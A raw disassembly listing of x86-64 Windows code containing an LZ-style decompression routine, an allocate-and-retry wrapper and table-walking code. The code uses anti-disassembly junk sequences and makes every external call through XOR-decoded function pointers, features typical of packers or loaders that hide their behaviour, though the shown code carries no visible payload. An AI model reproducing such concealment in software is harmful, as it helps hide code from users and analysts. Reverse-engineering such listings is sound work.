  4053e4:	0f 83 0a 00 00 00    	jae    0x4053f4
  4053ea:	b8 0b 00 00 00       	mov    $0xb,%eax
  4053ef:	e9 a4 00 00 00       	jmp    0x405498
  4053f4:	48 8b 45 10          	mov    0x10(%rbp),%rax
  4053f8:	48 83 f8 40          	cmp    $0x40,%rax
  4053fc:	0f 83 0a 00 00 00    	jae    0x40540c
  405402:	b8 0a 00 00 00       	mov    $0xa,%eax
  405407:	e9 8c 00 00 00       	jmp    0x405498
  40540c:	48 8b 45 10          	mov    0x10(%rbp),%rax
  405410:	48 81 f8 80 00 00 00 	cmp    $0x80,%rax
  405417:	0f 83 0a 00 00 00    	jae    0x405427
  40541d:	b8 09 00 00 00       	mov    $0x9,%eax
  405422:	e9 71 00 00 00       	jmp    0x405498
  405427:	48 8b 45 10          	mov    0x10(%rbp),%rax
  40542b:	48 81 f8 00 01 00 00 	cmp    $0x100,%rax
  405432:	0f 83 0a 00 00 00    	jae    0x405442
  405438:	b8 08 00 00 00       	mov    $0x8,%eax
  40543d:	e9 56 00 00 00       	jmp    0x405498
  405442:	48 8b 45 10          	mov    0x10(%rbp),%rax
  405446:	48 81 f8 00 02 00 00 	cmp    $0x200,%rax
  40544d:	0f 83 0a 00 00 00    	jae    0x40545d
  405453:	b8 07 00 00 00       	mov    $0x7,%eax
  405458:	e9 3b 00 00 00       	jmp    0x405498
  40545d:	48 8b 45 10          	mov    0x10(%rbp),%rax
  405461:	48 81 f8 00 04 00 00 	cmp    $0x400,%rax
  405468:	0f 83 0a 00 00 00    	jae    0x405478
  40546e:	b8 06 00 00 00       	mov    $0x6,%eax
  405473:	e9 20 00 00 00       	jmp    0x405498
  405478:	48 8b 45 10          	mov    0x10(%rbp),%rax
  40547c:	48 81 f8 00 08 00 00 	cmp    $0x800,%rax
  405483:	0f 83 0a 00 00 00    	jae    0x405493
  405489:	b8 05 00 00 00       	mov    $0x5,%eax
  40548e:	e9 05 00 00 00       	jmp    0x405498
  405493:	b8 04 00 00 00       	mov    $0x4,%eax
  405498:	c9                   	leave
  405499:	c3                   	ret
  40549a:	00 00                	add    %al,(%rax)
  40549c:	01 04 02             	add    %eax,(%rdx,%rax,1)
  40549f:	05 04 03 01 50       	add    $0x50010304,%eax
  4054a4:	cc                   	int3
  4054a5:	cc                   	int3
  4054a6:	e8 00 00 00 00       	call   0x4054ab
  4054ab:	48 83 c4 08          	add    $0x8,%rsp
  4054af:	c3                   	ret
  4054b0:	90                   	nop
  4054b1:	90                   	nop
  4054b2:	cc                   	int3
  4054b3:	90                   	nop
  4054b4:	eb 0b                	jmp    0x4054c1
  4054b6:	48 31 c0             	xor    %rax,%rax
  4054b9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  4054c0:	90                   	nop
  4054c1:	55                   	push   %rbp
  4054c2:	48 89 e5             	mov    %rsp,%rbp
  4054c5:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
  4054cc:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  4054d0:	48 89 55 18          	mov    %rdx,0x18(%rbp)
  4054d4:	4c 89 45 20          	mov    %r8,0x20(%rbp)
  4054d8:	4c 89 4d 28          	mov    %r9,0x28(%rbp)
  4054dc:	31 c0                	xor    %eax,%eax
  4054de:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  4054e2:	31 c0                	xor    %eax,%eax
  4054e4:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  4054e8:	48 8b 45 10          	mov    0x10(%rbp),%rax
  4054ec:	48 83 f8 00          	cmp    $0x0,%rax
  4054f0:	0f 84 1c 00 00 00    	je     0x405512
  4054f6:	48 8b 45 20          	mov    0x20(%rbp),%rax
  4054fa:	48 83 f8 00          	cmp    $0x0,%rax
  4054fe:	0f 84 0e 00 00 00    	je     0x405512
  405504:	48 8b 45 30          	mov    0x30(%rbp),%rax
  405508:	48 83 f8 00          	cmp    $0x0,%rax
  40550c:	0f 85 0a 00 00 00    	jne    0x40551c
  405512:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  405517:	e9 17 04 00 00       	jmp    0x405933
  40551c:	48 8b 45 30          	mov    0x30(%rbp),%rax
  405520:	31 c9                	xor    %ecx,%ecx
  405522:	48 89 08             	mov    %rcx,(%rax)
  405525:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  405529:	48 83 c0 01          	add    $0x1,%rax
  40552d:	48 8b 4d 18          	mov    0x18(%rbp),%rcx
  405531:	48 39 c8             	cmp    %rcx,%rax
  405534:	0f 83 e9 03 00 00    	jae    0x405923
  40553a:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  40553e:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
  405542:	48 01 c1             	add    %rax,%rcx
  405545:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  405549:	48 83 c0 01          	add    $0x1,%rax
  40554d:	48 8b 55 10          	mov    0x10(%rbp),%rdx
  405551:	48 01 c2             	add    %rax,%rdx
  405554:	0f b6 12             	movzbl (%rdx),%edx
  405557:	c1 e2 08             	shl    $0x8,%edx
  40555a:	0f b6 09             	movzbl (%rcx),%ecx
  40555d:	09 d1                	or     %edx,%ecx
  40555f:	0f b7 c9             	movzwl %cx,%ecx
  405562:	66 89 4d ee          	mov    %cx,-0x12(%rbp)
  405566:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  40556a:	48 83 c0 02          	add    $0x2,%rax
  40556e:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  405572:	0f b7 45 ee          	movzwl -0x12(%rbp),%eax
  405576:	83 f8 00             	cmp    $0x0,%eax
  405579:	0f 85 05 00 00 00    	jne    0x405584
  40557f:	e9 9f 03 00 00       	jmp    0x405923
  405584:	0f b7 45 ee          	movzwl -0x12(%rbp),%eax
  405588:	81 e0 ff 0f 00 00    	and    $0xfff,%eax
  40558e:	48 63 c0             	movslq %eax,%rax
  405591:	48 83 c0 01          	add    $0x1,%rax
  405595:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
  405599:	0f b7 45 ee          	movzwl -0x12(%rbp),%eax
  40559d:	81 e0 00 80 00 00    	and    $0x8000,%eax
  4055a3:	83 f8 00             	cmp    $0x0,%eax
  4055a6:	0f 95 c0             	setne  %al
  4055a9:	0f b6 c0             	movzbl %al,%eax
  4055ac:	89 45 dc             	mov    %eax,-0x24(%rbp)
  4055af:	8b 45 dc             	mov    -0x24(%rbp),%eax
  4055b2:	83 f8 00             	cmp    $0x0,%eax
  4055b5:	0f 85 b2 00 00 00    	jne    0x40566d
  4055bb:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4055bf:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
  4055c3:	48 01 c8             	add    %rcx,%rax
  4055c6:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
  4055ca:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  4055ce:	48 8b 4d 18          	mov    0x18(%rbp),%rcx
  4055d2:	48 39 c8             	cmp    %rcx,%rax
  4055d5:	0f 86 08 00 00 00    	jbe    0x4055e3
  4055db:	48 8b 45 18          	mov    0x18(%rbp),%rax
  4055df:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
  4055e3:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  4055e7:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
  4055eb:	48 29 c8             	sub    %rcx,%rax
  4055ee:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
  4055f2:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  4055f6:	48 8b 4d c8          	mov    -0x38(%rbp),%rcx
  4055fa:	48 01 c8             	add    %rcx,%rax
  4055fd:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
  405601:	48 39 c8             	cmp    %rcx,%rax
  405604:	0f 86 0a 00 00 00    	jbe    0x405614
  40560a:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  40560f:	e9 1f 03 00 00       	jmp    0x405933
  405614:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  405618:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
  40561c:	48 01 c1             	add    %rax,%rcx
  40561f:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  405623:	48 8b 55 10          	mov    0x10(%rbp),%rdx
  405627:	48 01 c2             	add    %rax,%rdx
  40562a:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  40562e:	49 89 c0             	mov    %rax,%r8
  405631:	49 89 d3             	mov    %rdx,%r11
  405634:	49 89 ca             	mov    %rcx,%r10
  405637:	4c 89 d1             	mov    %r10,%rcx
  40563a:	4c 89 da             	mov    %r11,%rdx
  40563d:	4c 8b 1d 74 74 00 00 	mov    0x7474(%rip),%r11        # 0x40cab8
  405644:	48 8b 05 95 74 00 00 	mov    0x7495(%rip),%rax        # 0x40cae0
  40564b:	4c 33 18             	xor    (%rax),%r11
  40564e:	41 ff d3             	call   *%r11
  405651:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  405655:	48 8b 4d c8          	mov    -0x38(%rbp),%rcx
  405659:	48 01 c8             	add    %rcx,%rax
  40565c:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  405660:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  405664:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  405668:	e9 b1 02 00 00       	jmp    0x40591e
  40566d:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  405671:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
  405675:	48 01 c8             	add    %rcx,%rax
  405678:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
  40567c:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  405680:	48 8b 4d 18          	mov    0x18(%rbp),%rcx
  405684:	48 39 c8             	cmp    %rcx,%rax
  405687:	0f 86 08 00 00 00    	jbe    0x405695
  40568d:	48 8b 45 18          	mov    0x18(%rbp),%rax
  405691:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
  405695:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  405699:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
  40569d:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4056a1:	48 8b 4d c0          	mov    -0x40(%rbp),%rcx
  4056a5:	48 39 c8             	cmp    %rcx,%rax
  4056a8:	0f 83 70 02 00 00    	jae    0x40591e
  4056ae:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4056b2:	48 8b 4d 18          	mov    0x18(%rbp),%rcx
  4056b6:	48 39 c8             	cmp    %rcx,%rax
  4056b9:	0f 82 05 00 00 00    	jb     0x4056c4
  4056bf:	e9 5a 02 00 00       	jmp    0x40591e
  4056c4:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4056c8:	48 89 c1             	mov    %rax,%rcx
  4056cb:	48 83 c0 01          	add    $0x1,%rax
  4056cf:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  4056d3:	48 8b 45 10          	mov    0x10(%rbp),%rax
  4056d7:	48 01 c8             	add    %rcx,%rax
  4056da:	0f b6 00             	movzbl (%rax),%eax
  4056dd:	88 45 b7             	mov    %al,-0x49(%rbp)
  4056e0:	b8 00 00 00 00       	mov    $0x0,%eax
  4056e5:	89 45 b0             	mov    %eax,-0x50(%rbp)
  4056e8:	8b 45 b0             	mov    -0x50(%rbp),%eax
  4056eb:	83 f8 08             	cmp    $0x8,%eax
  4056ee:	0f 8d 25 02 00 00    	jge    0x405919
  4056f4:	e9 0d 00 00 00       	jmp    0x405706
  4056f9:	8b 45 b0             	mov    -0x50(%rbp),%eax
  4056fc:	89 c1                	mov    %eax,%ecx
  4056fe:	83 c0 01             	add    $0x1,%eax
  405701:	89 45 b0             	mov    %eax,-0x50(%rbp)
  405704:	eb e2                	jmp    0x4056e8
  405706:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  40570a:	48 8b 4d c0          	mov    -0x40(%rbp),%rcx
  40570e:	48 39 c8             	cmp    %rcx,%rax
  405711:	0f 82 05 00 00 00    	jb     0x40571c
  405717:	e9 fd 01 00 00       	jmp    0x405919
  40571c:	0f b6 45 b7          	movzbl -0x49(%rbp),%eax
  405720:	8b 4d b0             	mov    -0x50(%rbp),%ecx
  405723:	d3 f8                	sar    %cl,%eax
  405725:	83 e0 01             	and    $0x1,%eax
  405728:	83 f8 00             	cmp    $0x0,%eax
  40572b:	0f 85 51 00 00 00    	jne    0x405782
  405731:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  405735:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
  405739:	48 39 c8             	cmp    %rcx,%rax
  40573c:	0f 82 0a 00 00 00    	jb     0x40574c
  405742:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  405747:	e9 e7 01 00 00       	jmp    0x405933
  40574c:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  405750:	48 89 c1             	mov    %rax,%rcx
  405753:	48 83 c0 01          	add    $0x1,%rax
  405757:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  40575b:	48 8b 45 20          	mov    0x20(%rbp),%rax
  40575f:	48 01 c8             	add    %rcx,%rax
  405762:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
  405766:	48 89 ca             	mov    %rcx,%rdx
  405769:	48 83 c1 01          	add    $0x1,%rcx
  40576d:	48 89 4d f8          	mov    %rcx,-0x8(%rbp)
  405771:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
  405775:	48 01 d1             	add    %rdx,%rcx
  405778:	0f b6 09             	movzbl (%rcx),%ecx
  40577b:	88 08                	mov    %cl,(%rax)
  40577d:	e9 92 01 00 00       	jmp    0x405914
  405782:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  405786:	48 83 c0 01          	add    $0x1,%rax
  40578a:	48 8b 4d 18          	mov    0x18(%rbp),%rcx
  40578e:	48 39 c8             	cmp    %rcx,%rax
  405791:	0f 82 0a 00 00 00    	jb     0x4057a1
  405797:	b8 fd ff ff ff       	mov    $0xfffffffd,%eax
  40579c:	e9 92 01 00 00       	jmp    0x405933
  4057a1:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4057a5:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
  4057a9:	48 01 c1             	add    %rax,%rcx
  4057ac:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4057b0:	48 83 c0 01          	add    $0x1,%rax
  4057b4:	48 8b 55 10          	mov    0x10(%rbp),%rdx
  4057b8:	48 01 c2             	add    %rax,%rdx
  4057bb:	0f b6 12             	movzbl (%rdx),%edx
  4057be:	c1 e2 08             	shl    $0x8,%edx
  4057c1:	0f b6 09             	movzbl (%rcx),%ecx
  4057c4:	09 d1                	or     %edx,%ecx
  4057c6:	0f b7 c9             	movzwl %cx,%ecx
  4057c9:	66 89 4d ae          	mov    %cx,-0x52(%rbp)
  4057cd:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4057d1:	48 83 c0 02          	add    $0x2,%rax
  4057d5:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  4057d9:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  4057dd:	48 8b 4d b8          	mov    -0x48(%rbp),%rcx
  4057e1:	48 29 c8             	sub    %rcx,%rax
  4057e4:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
  4057e8:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  4057ec:	48 83 f8 00          	cmp    $0x0,%rax
  4057f0:	0f 85 0a 00 00 00    	jne    0x405800
  4057f6:	b8 fd ff ff ff       	mov    $0xfffffffd,%eax
  4057fb:	e9 33 01 00 00       	jmp    0x405933
  405800:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  405804:	49 89 c2             	mov    %rax,%r10
  405807:	4c 89 d1             	mov    %r10,%rcx
  40580a:	4c 8b 1d df 72 00 00 	mov    0x72df(%rip),%r11        # 0x40caf0
  405811:	48 8b 05 00 73 00 00 	mov    0x7300(%rip),%rax        # 0x40cb18
  405818:	4c 33 18             	xor    (%rax),%r11
  40581b:	41 ff d3             	call   *%r11
  40581e:	66 89 45 9e          	mov    %ax,-0x62(%rbp)
  405822:	0f b7 45 9e          	movzwl -0x62(%rbp),%eax
  405826:	b9 01 00 00 00       	mov    $0x1,%ecx
  40582b:	89 4d 98             	mov    %ecx,-0x68(%rbp)
  40582e:	89 c1                	mov    %eax,%ecx
  405830:	8b 45 98             	mov    -0x68(%rbp),%eax
  405833:	d3 e0                	shl    %cl,%eax
  405835:	83 e8 01             	sub    $0x1,%eax
  405838:	0f b7 c0             	movzwl %ax,%eax
  40583b:	66 89 45 9c          	mov    %ax,-0x64(%rbp)
  40583f:	0f b7 45 ae          	movzwl -0x52(%rbp),%eax
  405843:	0f b7 4d 9c          	movzwl -0x64(%rbp),%ecx
  405847:	21 c8                	and    %ecx,%eax
  405849:	48 63 c0             	movslq %eax,%rax
  40584c:	48 83 c0 03          	add    $0x3,%rax
  405850:	48 89 45 90          	mov    %rax,-0x70(%rbp)
  405854:	0f b7 45 ae          	movzwl -0x52(%rbp),%eax
  405858:	0f b7 4d 9e          	movzwl -0x62(%rbp),%ecx
  40585c:	d3 f8                	sar    %cl,%eax
  40585e:	48 63 c0             	movslq %eax,%rax
  405861:	48 83 c0 01          	add    $0x1,%rax
  405865:	48 89 45 88          	mov    %rax,-0x78(%rbp)
  405869:	48 8b 45 88          	mov    -0x78(%rbp),%rax
  40586d:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
  405871:	48 39 c8             	cmp    %rcx,%rax
  405874:	0f 86 0a 00 00 00    	jbe    0x405884
  40587a:	b8 fd ff ff ff       	mov    $0xfffffffd,%eax
  40587f:	e9 af 00 00 00       	jmp    0x405933
  405884:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  405888:	48 8b 4d 90          	mov    -0x70(%rbp),%rcx
  40588c:	48 01 c8             	add    %rcx,%rax
  40588f:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
  405893:	48 39 c8             	cmp    %rcx,%rax
  405896:	0f 86 0a 00 00 00    	jbe    0x4058a6
  40589c:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  4058a1:	e9 8d 00 00 00       	jmp    0x405933
  4058a6:	31 c0                	xor    %eax,%eax
  4058a8:	48 89 45 80          	mov    %rax,-0x80(%rbp)
  4058ac:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  4058b0:	48 8b 4d 90          	mov    -0x70(%rbp),%rcx
  4058b4:	48 39 c8             	cmp    %rcx,%rax
  4058b7:	0f 83 48 00 00 00    	jae    0x405905
  4058bd:	e9 11 00 00 00       	jmp    0x4058d3
  4058c2:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  4058c6:	48 89 c1             	mov    %rax,%rcx
  4058c9:	48 83 c0 01          	add    $0x1,%rax
  4058cd:	48 89 45 80          	mov    %rax,-0x80(%rbp)
  4058d1:	eb d9                	jmp    0x4058ac
  4058d3:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  4058d7:	48 8b 4d 80          	mov    -0x80(%rbp),%rcx
  4058db:	48 01 c8             	add    %rcx,%rax
  4058de:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
  4058e2:	48 01 c1             	add    %rax,%rcx
  4058e5:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  4058e9:	48 8b 55 88          	mov    -0x78(%rbp),%rdx
  4058ed:	48 29 d0             	sub    %rdx,%rax
  4058f0:	48 8b 55 80          	mov    -0x80(%rbp),%rdx
  4058f4:	48 01 d0             	add    %rdx,%rax
  4058f7:	48 8b 55 20          	mov    0x20(%rbp),%rdx
  4058fb:	48 01 c2             	add    %rax,%rdx
  4058fe:	0f b6 12             	movzbl (%rdx),%edx
  405901:	88 11                	mov    %dl,(%rcx)
  405903:	eb bd                	jmp    0x4058c2
  405905:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  405909:	48 8b 4d 90          	mov    -0x70(%rbp),%rcx
  40590d:	48 01 c8             	add    %rcx,%rax
  405910:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  405914:	e9 e0 fd ff ff       	jmp    0x4056f9
  405919:	e9 7f fd ff ff       	jmp    0x40569d
  40591e:	e9 02 fc ff ff       	jmp    0x405525
  405923:	48 8b 45 30          	mov    0x30(%rbp),%rax
  405927:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
  40592b:	48 89 08             	mov    %rcx,(%rax)
  40592e:	b8 00 00 00 00       	mov    $0x0,%eax
  405933:	c9                   	leave
  405934:	c3                   	ret
  405935:	cc                   	int3
  405936:	cc                   	int3
  405937:	e8 00 00 00 00       	call   0x40593c
  40593c:	48 83 c4 08          	add    $0x8,%rsp
  405940:	c3                   	ret
  405941:	90                   	nop
  405942:	90                   	nop
  405943:	cc                   	int3
  405944:	90                   	nop
  405945:	eb 0b                	jmp    0x405952
  405947:	48 31 c0             	xor    %rax,%rax
  40594a:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  405951:	90                   	nop
  405952:	55                   	push   %rbp
  405953:	48 89 e5             	mov    %rsp,%rbp
  405956:	48 81 ec 50 00 00 00 	sub    $0x50,%rsp
  40595d:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  405961:	48 89 55 18          	mov    %rdx,0x18(%rbp)
  405965:	4c 89 45 20          	mov    %r8,0x20(%rbp)
  405969:	4c 89 4d 28          	mov    %r9,0x28(%rbp)
  40596d:	48 8b 45 18          	mov    0x18(%rbp),%rax
  405971:	48 c1 e0 03          	shl    $0x3,%rax
  405975:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  405979:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  40597d:	48 81 f8 00 10 00 00 	cmp    $0x1000,%rax
  405984:	0f 83 09 00 00 00    	jae    0x405993
  40598a:	b8 00 10 00 00       	mov    $0x1000,%eax
  40598f:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  405993:	48 8b 45 10          	mov    0x10(%rbp),%rax
  405997:	48 83 f8 00          	cmp    $0x0,%rax
  40599b:	0f 84 1c 00 00 00    	je     0x4059bd
  4059a1:	48 8b 45 20          	mov    0x20(%rbp),%rax
  4059a5:	48 83 f8 00          	cmp    $0x0,%rax
  4059a9:	0f 84 0e 00 00 00    	je     0x4059bd
  4059af:	48 8b 45 28          	mov    0x28(%rbp),%rax
  4059b3:	48 83 f8 00          	cmp    $0x0,%rax
  4059b7:	0f 85 0a 00 00 00    	jne    0x4059c7
  4059bd:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4059c2:	e9 03 01 00 00       	jmp    0x405aca
  4059c7:	48 8b 45 20          	mov    0x20(%rbp),%rax
  4059cb:	31 c9                	xor    %ecx,%ecx
  4059cd:	48 89 08             	mov    %rcx,(%rax)
  4059d0:	48 8b 45 28          	mov    0x28(%rbp),%rax
  4059d4:	31 c9                	xor    %ecx,%ecx
  4059d6:	48 89 08             	mov    %rcx,(%rax)
  4059d9:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4059dd:	49 89 c2             	mov    %rax,%r10
  4059e0:	4c 89 d1             	mov    %r10,%rcx
  4059e3:	4c 8b 1d 3e 71 00 00 	mov    0x713e(%rip),%r11        # 0x40cb28
  4059ea:	48 8b 05 5f 71 00 00 	mov    0x715f(%rip),%rax        # 0x40cb50
  4059f1:	4c 33 18             	xor    (%rax),%r11
  4059f4:	41 ff d3             	call   *%r11
  4059f7:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  4059fb:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  4059ff:	48 83 f8 00          	cmp    $0x0,%rax
  405a03:	0f 85 0a 00 00 00    	jne    0x405a13
  405a09:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  405a0e:	e9 b7 00 00 00       	jmp    0x405aca
  405a13:	31 c0                	xor    %eax,%eax
  405a15:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  405a19:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
  405a1d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  405a22:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  405a26:	49 89 c1             	mov    %rax,%r9
  405a29:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  405a2d:	49 89 c0             	mov    %rax,%r8
  405a30:	48 8b 45 18          	mov    0x18(%rbp),%rax
  405a34:	49 89 c3             	mov    %rax,%r11
  405a37:	48 8b 45 10          	mov    0x10(%rbp),%rax
  405a3b:	49 89 c2             	mov    %rax,%r10
  405a3e:	4c 89 d1             	mov    %r10,%rcx
  405a41:	4c 89 da             	mov    %r11,%rdx
  405a44:	4c 8b 1d 15 71 00 00 	mov    0x7115(%rip),%r11        # 0x40cb60
  405a4b:	48 8b 05 36 71 00 00 	mov    0x7136(%rip),%rax        # 0x40cb88
  405a52:	4c 33 18             	xor    (%rax),%r11
  405a55:	41 ff d3             	call   *%r11
  405a58:	89 45 e4             	mov    %eax,-0x1c(%rbp)
  405a5b:	8b 45 e4             	mov    -0x1c(%rbp),%eax
  405a5e:	83 f8 00             	cmp    $0x0,%eax
  405a61:	0f 85 20 00 00 00    	jne    0x405a87
  405a67:	48 8b 45 20          	mov    0x20(%rbp),%rax
  405a6b:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
  405a6f:	48 89 08             	mov    %rcx,(%rax)
  405a72:	48 8b 45 28          	mov    0x28(%rbp),%rax
  405a76:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
  405a7a:	48 89 08             	mov    %rcx,(%rax)
  405a7d:	b8 00 00 00 00       	mov    $0x0,%eax
  405a82:	e9 43 00 00 00       	jmp    0x405aca
  405a87:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  405a8b:	49 89 c2             	mov    %rax,%r10
  405a8e:	4c 89 d1             	mov    %r10,%rcx
  405a91:	4c 8b 1d 00 71 00 00 	mov    0x7100(%rip),%r11        # 0x40cb98
  405a98:	48 8b 05 21 71 00 00 	mov    0x7121(%rip),%rax        # 0x40cbc0
  405a9f:	4c 33 18             	xor    (%rax),%r11
  405aa2:	41 ff d3             	call   *%r11
  405aa5:	8b 45 e4             	mov    -0x1c(%rbp),%eax
  405aa8:	83 f8 fe             	cmp    $0xfffffffe,%eax
  405aab:	0f 85 11 00 00 00    	jne    0x405ac2
  405ab1:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  405ab5:	48 c1 e0 01          	shl    $0x1,%rax
  405ab9:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  405abd:	e9 17 ff ff ff       	jmp    0x4059d9
  405ac2:	8b 45 e4             	mov    -0x1c(%rbp),%eax
  405ac5:	e9 00 00 00 00       	jmp    0x405aca
  405aca:	c9                   	leave
  405acb:	c3                   	ret
  405acc:	cc                   	int3
  405acd:	cc                   	int3
  405ace:	e8 00 00 00 00       	call   0x405ad3
  405ad3:	48 83 c4 08          	add    $0x8,%rsp
  405ad7:	c3                   	ret
  405ad8:	90                   	nop
  405ad9:	90                   	nop
  405ada:	cc                   	int3
  405adb:	90                   	nop
  405adc:	eb 0b                	jmp    0x405ae9
  405ade:	48 31 c0             	xor    %rax,%rax
  405ae1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  405ae8:	90                   	nop
  405ae9:	55                   	push   %rbp
  405aea:	48 89 e5             	mov    %rsp,%rbp
  405aed:	48 81 ec 20 00 00 00 	sub    $0x20,%rsp
  405af4:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  405af8:	48 8b 45 10          	mov    0x10(%rbp),%rax
  405afc:	49 89 c2             	mov    %rax,%r10
  405aff:	4c 89 d1             	mov    %r10,%rcx
  405b02:	4c 8b 1d c7 70 00 00 	mov    0x70c7(%rip),%r11        # 0x40cbd0
  405b09:	48 8b 05 e8 70 00 00 	mov    0x70e8(%rip),%rax        # 0x40cbf8
  405b10:	4c 33 18             	xor    (%rax),%r11
  405b13:	41 ff d3             	call   *%r11
  405b16:	c9                   	leave
  405b17:	c3                   	ret
  405b18:	cc                   	int3
  405b19:	cc                   	int3
  405b1a:	e8 00 00 00 00       	call   0x405b1f
  405b1f:	48 83 c4 08          	add    $0x8,%rsp
  405b23:	c3                   	ret
  405b24:	90                   	nop
  405b25:	90                   	nop
  405b26:	cc                   	int3
  405b27:	90                   	nop
  405b28:	55                   	push   %rbp
  405b29:	48 89 e5             	mov    %rsp,%rbp
  405b2c:	48 81 ec 40 00 00 00 	sub    $0x40,%rsp
  405b33:	b8 00 00 00 00       	mov    $0x0,%eax
  405b38:	89 45 fc             	mov    %eax,-0x4(%rbp)
  405b3b:	8b 45 fc             	mov    -0x4(%rbp),%eax
  405b3e:	83 f8 32             	cmp    $0x32,%eax
  405b41:	0f 83 ab 00 00 00    	jae    0x405bf2
  405b47:	e9 0d 00 00 00       	jmp    0x405b59
  405b4c:	8b 45 fc             	mov    -0x4(%rbp),%eax
  405b4f:	89 c1                	mov    %eax,%ecx
  405b51:	83 c0 01             	add    $0x1,%eax
  405b54:	89 45 fc             	mov    %eax,-0x4(%rbp)
  405b57:	eb e2                	jmp    0x405b3b
  405b59:	8b 45 fc             	mov    -0x4(%rbp),%eax
  405b5c:	48 c1 e0 04          	shl    $0x4,%rax
  405b60:	48 8d 0d 01 3c 00 00 	lea    0x3c01(%rip),%rcx        # 0x409768
  405b67:	48 01 c1             	add    %rax,%rcx
  405b6a:	48 8b 09             	mov    (%rcx),%rcx
  405b6d:	48 89 4d f0          	mov    %rcx,-0x10(%rbp)
  405b71:	8b 45 fc             	mov    -0x4(%rbp),%eax
  405b74:	48 c1 e0 04          	shl    $0x4,%rax
  405b78:	48 8d 0d e9 3b 00 00 	lea    0x3be9(%rip),%rcx        # 0x409768
  405b7f:	48 01 c1             	add    %rax,%rcx
